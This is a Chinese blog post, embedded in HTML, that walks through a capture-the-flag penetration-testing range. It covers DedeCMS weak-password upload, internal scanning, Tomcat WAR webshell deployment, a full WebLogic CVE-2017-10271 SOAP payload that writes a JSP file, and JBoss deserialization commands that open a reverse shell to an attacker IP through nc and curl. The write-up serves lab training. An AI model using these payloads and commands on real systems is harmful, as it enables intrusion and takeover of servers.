@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    简单的靶场渗透 |  
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-简单的靶场渗透"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  简单的靶场渗透
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="article-date">
+  <time datetime="2022-01-02T18:17:22.000Z" itemprop="datePublished">2022-01-03</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">7 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br></pre></td></tr></table></figure>
+
+<p>[TOC]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">获得flag:</span><br><span class="line">1.14.65.168    </span><br><span class="line">        flag&#123;dc53e209ffa7f1cd8c7ebdc2eeff34a7&#125;    </span><br><span class="line">flag1 : flag&#123;f784234649d7ef161229349d1d76ba8d&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.38tomcat</span><br><span class="line">flag3 ：flag&#123;03bbcaf39bdd08fa8d0d9e5477e102c5&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.66</span><br><span class="line">flag5  :flag&#123;b717ca3e4543f05e6970ede833d68ba4&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.76</span><br><span class="line">flag4  :flag&#123;22fceae28669c34d139f7ff6db690acb&#125; </span><br><span class="line"></span><br><span class="line">172.16.20.135</span><br><span class="line">flag9  :flag&#123;27e6221a8a55c8ee7396e74531dc7d9d&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Powered by <a target="_blank" rel="noopener" href="http://www.dedecms.com/"><strong>DedeCMSV57_UTF8_SP1</strong></a> </p>
+<p><a target="_blank" rel="noopener" href="http://1.14.65.168:8077/data/admin/ver.txt">http://1.14.65.168:8077/data/admin/ver.txt</a>       版本时间20170303</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a target="_blank" rel="noopener" href="http://1.14.65.168:8077/dede/">http://1.14.65.168:8077/dede/</a>             admin/admin 后台弱口令</p>
+<p>后台任意文件上传</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102150406908.png" alt="image-20220102150406908"></p>
+<p>哥斯拉连接，看了要提权</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151302899.png" alt="image-20220102151302899"></p>
+<p>html目录下     第一个flag{dc53e209ffa7f1cd8c7ebdc2eeff34a7}  ，或者robots.txt 直接给的有路径</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151350497.png" alt="image-20220102151350497"></p>
+<p>根目录下   第二个flag{f784234649d7ef161229349d1d76ba8d}</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151427997.png" alt="image-20220102151427997"></p>
+<p>本机为172.16.20.66</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102152600971.png" alt="image-20220102152600971"></p>
+<h2 id="内网其他主机扫描"><a href="#内网其他主机扫描" class="headerlink" title="内网其他主机扫描"></a>内网其他主机扫描</h2><p>发现某位师傅的fscan（<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a>），正好对内网172.16.20.* 网段存活主机扫描</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102155438573.png" alt="image-20220102155438573"></p>
+<p>发现其他5台存活主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target &#39;172.16.20.38&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.62&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.66&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.76&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.135&#39; is alive</span><br><span class="line">icmp alive hosts len is: 5</span><br><span class="line">172.16.20.38:8009 open</span><br><span class="line">172.16.20.135:8009 open</span><br><span class="line">172.16.20.66:1080 open</span><br><span class="line">172.16.20.135:8080 open</span><br><span class="line">172.16.20.76:8080 open</span><br><span class="line">172.16.20.38:8080 open</span><br><span class="line">172.16.20.62:7001 open</span><br><span class="line">172.16.20.66:80 open</span><br><span class="line">172.16.20.135:8093 open</span><br><span class="line">172.16.20.135:8083 open</span><br><span class="line">alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.62:7001  code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.62:7001  [weblogic] </span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080  code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8083 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 code:200 len:10     title:Login Page</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.38:8080  code:200 len:20     title:Apache Tomcat&#x2F;8.0.43</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8080 code:200 len:1507   title:Welcome to JBoss&amp;trade;</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.66       code:200 len:12     title:我的网站</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 [Shiro] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.135:8080 [Jboss JBOSS] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080&#x2F;manager&#x2F;html tomcat tomcat</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080 poc-yaml-tomcat-manager-week</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h2><p>frp 代理出现两个问题，</p>
+<p>1，我的frpc竟然不能运行，重新下载了</p>
+<p>2，这个报错是frpc.ini里面的注释没有删除</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164513360.png" alt="image-20220102164513360"></p>
+<p>终于代理好了，</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164839124.png" alt="image-20220102164839124"></p>
+<p>下面就一个一个网站看吧</p>
+<h3 id="172-16-20-38-tomcat"><a href="#172-16-20-38-tomcat" class="headerlink" title="172.16.20.38 tomcat"></a>172.16.20.38 tomcat</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165200772.png" alt="image-20220102165200772"></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.20.38:8080/manager/html">http://172.16.20.38:8080/manager/html</a> </p>
+<p>tomcat tomcat登陆，进入后台</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165822763.png" alt="image-20220102165822763"></p>
+<p>Tomcat 后台部署war木马getshell       哥斯拉生成shel.jsp，jar -cvf sh.war shel.jsp</p>
+<p><img src="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/Users/25390/Desktop/ded新年靶场/dedsec新年靶场记录.assets/image-20220102172206117.png" alt="image-20220102172206117"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173735362.png" alt="image-20220102173735362"></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.20.38:8080/sh/shel.jsp">http://172.16.20.38:8080/sh/shel.jsp</a>  </p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173917456.png" alt="image-20220102173917456"></p>
+<p>拿到flag3 ：flag{03bbcaf39bdd08fa8d0d9e5477e102c5}</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174042500.png" alt="image-20220102174042500"></p>
+<p>root权限，双网卡发现inet 10.2.5.20/20 brd 10.2.15.255 scope global eth1  另一个网段10.2.5.*</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174312642.png" alt="image-20220102174312642"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174301803.png" alt="image-20220102174301803"></p>
+<h3 id="172-16-20-62-weblogic"><a href="#172-16-20-62-weblogic" class="headerlink" title="172.16.20.62 weblogic"></a>172.16.20.62 weblogic</h3><p><a target="_blank" rel="noopener" href="http://172.16.20.62:7001/">http://172.16.20.62:7001</a>  fscan扫出来的是weblogic</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>能访问<a target="_blank" rel="noopener" href="http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11%E8%AF%B4%E6%98%8E%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8cve-2017-10271%E6%BC%8F%E6%B4%9E">http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11说明可能存在cve-2017-10271漏洞</a></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102181059955.png" alt="image-20220102181059955"></p>
+<p>我说咋不能利用exp，原来，burp没有挂代理。。。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span><span class="number">.20</span><span class="number">.62</span>:<span class="number">7001</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">95.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">95.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 3282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span></span><br><span class="line"><span class="comment">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;string&gt;</span></span><br><span class="line"><span class="comment">&lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="comment">                    &lt;/object&gt;</span></span><br><span class="line"><span class="comment">            &lt;/java&gt;</span></span><br><span class="line"><span class="comment">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;% out.print(&quot;test&quot;); %&gt; 换成对应jsp🐎</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003302676.png" alt="image-20220103003302676"></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.20.62:7001/wls-wsat/1.jsp">http://172.16.20.62:7001/wls-wsat/1.jsp</a></p>
+<p><img src="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/Users/25390/Desktop/ded新年靶场/dedsec新年靶场记录.assets/image-20220103003242901.png" alt="image-20220103003242901"></p>
+<p>冰蝎链接</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002839036.png" alt="image-20220103002839036"></p>
+<p>root用户，无其他网段</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002921369.png" alt="image-20220103002921369"></p>
+<p>flag5  :flag{b717ca3e4543f05e6970ede833d68ba4}</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003009202.png" alt="image-20220103003009202"></p>
+<h3 id="172-16-20-76-Shiro"><a href="#172-16-20-76-Shiro" class="headerlink" title="172.16.20.76 Shiro"></a>172.16.20.76 Shiro</h3><p>[*] WebTitle:<a target="_blank" rel="noopener" href="http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33">http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33</a> code:200 len:10     title:Login Page</p>
+<p>确定为Shiro</p>
+<p>用工具<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack/releases">https://github.com/j1anFen/shiro_attack/releases</a></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021106383-16411470674991.png" alt="image-20220103021106383"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021136691.png" alt="image-20220103021136691"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021026217.png" alt="image-20220103021026217"></p>
+<h3 id="172-16-20-135-JBoss"><a href="#172-16-20-135-JBoss" class="headerlink" title="172.16.20.135 JBoss"></a>172.16.20.135 JBoss</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102231302358.png" alt="image-20220102231302358"></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://172.16.20.135:8080/web-console/">JBoss Web Console</a></p>
+<p>  admin  admin 进入</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102230723865.png" alt="image-20220102230723865"></p>
+<p>确定版本可以使用CVE-2017-7504  [JBoss 4.x JBossMQ JMS 反序列化漏洞]([（CVE 2017 7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 - Wiki (96.mk)](<a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-7504%EF%BC%89JBoss">https://wiki.96.mk/Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss</a> 4.x JBossMQ JMS 反序列化漏洞/))</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;ianxtianxt&#x2F;CVE-2015-7501.git</span><br><span class="line"></span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">curl http:&#x2F;&#x2F;172.16.20.135:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102233858765.png" alt="image-20220102233858765"></p>
+<p>root权限</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234228765.png" alt="image-20220102234228765"></p>
+<p>inet 10.2.5.62/20 brd 10.2.15.255 scope global eth1    发现10.2.5.*网段</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234258565.png" alt="image-20220102234258565"></p>
+<hr>
+<p>干不动了，二层三层内网后续更新，哎实际上就是代理+漏洞复现。</p>
+<p>感悟：第一是工具，第二是漏洞不是很敏感</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">工具安装记录</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BtFy2jdBgUlyi7OzkMI8hyk2-gzGzoHsz",
+    app_key: "hfvNNRgvRm7RUTPbb0m3ylVu",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2022
+        <i class="ri-heart-fill heart_icon"></i> Shmily-ing
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer.png" alt="Shmily-ing"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="https://github.com/Shmily-ing" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
